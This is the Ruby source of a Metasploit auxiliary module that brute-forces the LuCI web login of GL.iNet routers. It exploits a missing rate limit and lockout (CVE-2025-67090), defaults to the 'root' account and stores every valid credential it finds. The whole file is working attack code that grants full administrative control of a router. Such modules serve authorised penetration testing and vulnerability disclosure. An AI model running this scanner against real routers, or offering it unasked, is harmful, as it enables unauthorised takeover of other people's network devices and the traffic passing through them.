##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/glinet'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GL.iNet Router LuCI Login Scanner',
        'Description' => %q{
          This module performs brute-force authentication attempts against the
          LuCI web interface on GL.iNet routers. The interface lacks rate limiting
          or account lockout mechanisms, making it vulnerable to unrestricted
          brute-force attacks (CVE-2025-67090). Successful authentication provides
          full administrative access to the router.
        },
        'Author' => [
          'Aleksa Zatezalo', # Vulnerability discovery
          'Aleksa Zatezalo'  # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-67090'],
          ['URL', 'https://github.com/AleksaZatezalo/glinet-1800-rce'],
          ['CVE', '1999-0502'] # Weak password
        ],
        'DefaultOptions' => {
          'RPORT' => 80,
          'USERNAME' => 'root'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'URI for LuCI login', '/cgi-bin/luci']),
      OptString.new('USERNAME', [false, 'Username for authentication (default: root)', 'root'])
    ])

    register_autofilter_ports([80, 443, 8080])
  end

  def scanner(ip)
    @scanner ||= lambda {
      cred_collection = build_credential_collection(
        username: datastore['USERNAME'],
        password: datastore['PASSWORD']
      )

      Metasploit::Framework::LoginScanner::GLiNet.new(
        configure_http_login_scanner(
          host: ip,
          port: datastore['RPORT'],
          uri: datastore['TARGETURI'],
          cred_details: cred_collection,
          stop_on_success: datastore['STOP_ON_SUCCESS'],
          bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
          connection_timeout: 10
        )
      )
    }.call
  end

  def run_host(ip)
    # Validate target
    msg = scanner(ip).check_setup
    if msg
      print_error(msg.to_s)
      return
    end

    # Scan credentials
    scanner(ip).scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        private_type: :password
      )

      if result.success?
        # Report valid credential
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good("Success: '#{result.credential.public}:#{result.credential.private}'")
      else
        invalidate_login(credential_data)
        vprint_error("Failed: '#{result.credential.public}:#{result.credential.private}'")
      end
    end
  end
end
